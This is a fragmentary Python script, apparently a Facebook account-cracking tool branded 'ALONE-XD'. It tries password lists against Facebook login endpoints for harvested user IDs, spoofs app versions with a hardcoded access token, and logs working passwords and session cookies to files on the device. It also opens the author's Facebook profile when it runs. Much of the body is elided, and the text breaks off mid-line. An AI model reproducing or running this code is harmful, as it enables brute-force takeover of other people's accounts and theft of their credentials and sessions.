...
def joined(ids):
    ...
    return creation  
os.system("xdg-open https://www.facebook.com/profile.php?id=61565906489735")        
def getKey():
    ...
    return bumper
logo=("""
 .S_SSSs    S.        sSSs_sSSs     .S_sSSs      sSSs  
.SS~SSSSS   SS.      d%%SP~YS%%b   .SS~YS%%b    d%%SP  
S%S   SSSS  S%S     d%S'     `S%b  S%S   `S%b  d%S'    
S%S    S%S  S%S     S%S       S%S  S%S    S%S  S%S     
S%S SSSS%S  S&S     S&S       S&S  S%S    S&S  S&S     
S&S  SSS%S  S&S     S&S       S&S  S&S    S&S  S&S_Ss  
S&S    S&S  S&S     S&S       S&S  S&S    S&S  S&S~SP  
S&S    S&S  S&S     S&S       S&S  S&S    S&S  S&S     
S*S    S&S  S*b     S*b       d*S  S*S    S*S  S*b     
S*S    S*S  S*S.    S*S.     .S*S  S*S    S*S  S*S.    
S*S    S*S   SSSbs   SSSbs_sdSSS   S*S    S*S   SSSbs  
SSS    S*S    YSSP    YSSP~YSSY    S*S    SSS    YSSP  
       SP                          SP                  
       Y                           Y                   
...
def M1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [ALONE-XD] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        open('/sdcard/ALONE_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ALONE_COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        Elite(ids,pas,cookie)
                                        oks.append(ids)
                                        break
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[ALONE-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                              #  print('\r\r\x1b[1;91m [ALONE-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ALONE-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/ALONE-BRAND-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
...
def rndm1(ids,passlist):
        global loop
        global oks,cps
        sys.stdout.write('\r\r\033[1;32m [NADEEM-RNDM] %s|OK-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/ALONE_COOKIE.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')                                     
                                        open('/sdcard/ALONE-R-XD-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                ...
                                if uid in oks:pass
                                     ...
                                     #   print('\r\r\x1b[38;5;208m [ALONE-CP] '+str(uid)+' | '+pas+'\033[1;97m')
...
def rndm(ids,passlist):
        global loop
        global oks,cps
        sys.stdout.write('\r\r\033[1;37m [ALONE-RNDM] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'                        
                        facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
                        ...
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f
